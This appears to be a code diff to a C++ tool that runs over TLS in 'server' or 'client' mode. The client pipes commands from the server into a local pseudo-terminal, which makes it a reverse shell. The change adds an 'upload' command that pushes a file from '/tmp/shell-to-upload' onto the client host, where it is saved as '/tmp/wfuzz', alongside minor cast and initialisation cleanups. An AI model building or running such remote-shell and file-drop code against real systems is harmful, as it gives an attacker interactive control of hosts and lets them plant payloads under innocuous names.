@@ -38,13 +38,13 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
         exit(EXIT_FAILURE);
     }
 
-    sockaddr_in serverAddr;
+    sockaddr_in serverAddr{};
     serverAddr.sin_family = AF_INET; // define IPV4
     serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
     serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)
 
     // check bind is okay
-    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
+    if (bind(serverSocket, reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr)) < 0) {
         std::cout << "Failed to bind server socket!" << std::endl;
         exit(EXIT_FAILURE);
     }
@@ -131,9 +131,16 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
                     // execute shutdown
                     safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                 }
+                else if (inputCmd.find("upload") != std::string::npos) {
+                    char* fileBuffer = uploadFile("server", "/tmp/shell-to-upload", "/tmp/shell");
+                    const char* uploadBuf = (inputCmd += fileBuffer).c_str();
+                    SSL_write(ssl, uploadBuf, strlen(uploadBuf));
+                }
+                else {
+                    // if not 'exit' send to client
+                    SSL_write(ssl, ttyBuffer, input);
+                }
 
-                // if not 'exit' send to client
-                SSL_write(ssl, ttyBuffer, input);
             }
         }
     }
@@ -156,13 +163,13 @@ void client(const std::string &ipAddr, unsigned int portNum) {
     }
 
     // socket info
-    sockaddr_in serverAddr;
+    sockaddr_in serverAddr{};
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(portNum);
     serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());
     char socket_buffer[1024];
 
-    if (connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) < 0) {
+    if (connect(clientSocket, reinterpret_cast<struct sockaddr *>(&serverAddr),sizeof(serverAddr)) < 0) {
         std::cout << "Failed to connect to server!" << std::endl;
         close(clientSocket);
         exit(-1);
@@ -215,8 +222,18 @@ void client(const std::string &ipAddr, unsigned int portNum) {
                 std::cout << serverDisconnected << std::endl;
                 break;
             }
-            // ssl not required here as were just writing to local shell
-            write(masterFd, ttyBuffer, bytesReceived);
+
+            // server has requested an upload, so we dont send the data coming in to
+            // the masterfD, infact we upload the file to the server
+            std::string tmpStr(ttyBuffer, bytesReceived);
+            if (tmpStr.find("upload")  != std::string::npos) {
+                std::cout << "[!] Upload requested!" << std::endl;
+                uploadFile("client", tmpStr.c_str(), "/tmp/wfuzz");
+            }else {
+                // ssl not required here as were just writing to local shell
+                write(masterFd, ttyBuffer, bytesReceived);
+            }
+
         }
 
         // from tty to server
@@ -239,8 +256,7 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 }
 
 
-int main(int argc, char *argv[]) {
-
+int main(const int argc, char *argv[]) {
 
     /*  Program Layout
      *  User passes argument 'client' or 'server'
